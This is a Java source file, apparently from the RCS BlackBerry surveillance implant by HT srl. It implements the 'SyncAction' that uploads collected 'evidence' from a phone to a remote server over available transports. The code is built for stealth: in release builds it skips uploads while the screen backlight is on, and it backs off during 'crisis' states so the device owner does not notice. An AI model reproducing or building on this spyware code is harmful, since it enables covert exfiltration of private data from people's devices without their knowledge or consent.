//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync;

import java.util.Vector;

import net.rim.blackberry.api.homescreen.HomeScreen;
import net.rim.device.api.crypto.RandomSource;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Dialog;
import blackberry.Main;
import blackberry.Messages;
import blackberry.Status;
import blackberry.Trigger;
import blackberry.action.SubActionMain;
import blackberry.action.sync.protocol.ProtocolException;
import blackberry.action.sync.protocol.ZProtocol;
import blackberry.action.sync.transport.Transport;
import blackberry.config.ConfAction;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceCollector;
import blackberry.manager.ModuleManager;

public abstract class SyncAction extends SubActionMain {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
    //#endif
    protected EvidenceCollector logCollector;
    protected ModuleManager agentManager;
    // protected Transport[] transports = new Transport[Transport.NUM];
    protected Vector transports;
    protected Protocol protocol;

    protected boolean initialized;

    public SyncAction(ConfAction conf) {
        super(conf);

        logCollector = EvidenceCollector.getInstance();
        agentManager = ModuleManager.getInstance();
        transports = new Vector();

        protocol = new ZProtocol();
        initialized = parse(conf);
        initialized &= initTransport();
    }

    public boolean execute(Trigger trigger) {
        //#ifdef DBC
        Check.requires(protocol != null, "execute: null protocol");
        Check.requires(transports != null, "execute: null transports");
        //#endif

        if (status.crisisSync()) {
            //#ifdef DEBUG
            debug.warn("SyncAction - no sync, we are in crisis");
            //#endif
            return false;
        }

        if (Status.self().isDemo()) {
            Main.setWallpaper(true);
        }

        //#ifndef DEBUG
        if (Backlight.isEnabled() && !Status.getInstance().isDemo()) {
            return false;
        }
        //#endif

        if (DeviceInfo.getIdleTime() > 600 && RandomSource.getInt(10) == 0) {
            //#ifdef DEBUG
            debug.trace("execute garbage collector");
            //debug.traceMemory();
            //#endif        

            System.gc();
        }

        boolean ret = false;

        for (int i = 0; i < transports.size(); i++) {
            Transport transport = (Transport) transports.elementAt(i);

            //#ifdef DEBUG
            debug.trace("execute transport: " + transport);
            debug.trace("transport Sync url: " + transport.getUrl());
            //#endif                       

            if (transport.isAvailable()) {
                //#ifdef DEBUG
                debug.trace("execute: transport available");
                //#endif
                protocol.init(transport);

                try {
                    if (Status.self().wantLight()) {
                        Debug.ledFlash(Debug.COLOR_YELLOW);
                    }

                    ret = protocol.perform();

                } catch (ProtocolException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                    ret = false;
                }
                //#ifdef DEBUG
                debug.trace("execute protocol: " + ret);
                //#endif

            } else {
                //#ifdef DEBUG
                debug.trace("execute: transport not available");
                //#endif
            }

            if (ret) {
                //#ifdef TRACEMEMORY
                debug.info("SyncAction OK");
                Evidence.info("Synced with url:" + transport.getUrl());
                debug.traceMemory();
                //#endif

                return true;
            }

            //#ifdef DEBUG
            debug.error("SyncAction Unable to perform");
            //#endif

        }

        return false;
    }

    protected abstract boolean initTransport();

}
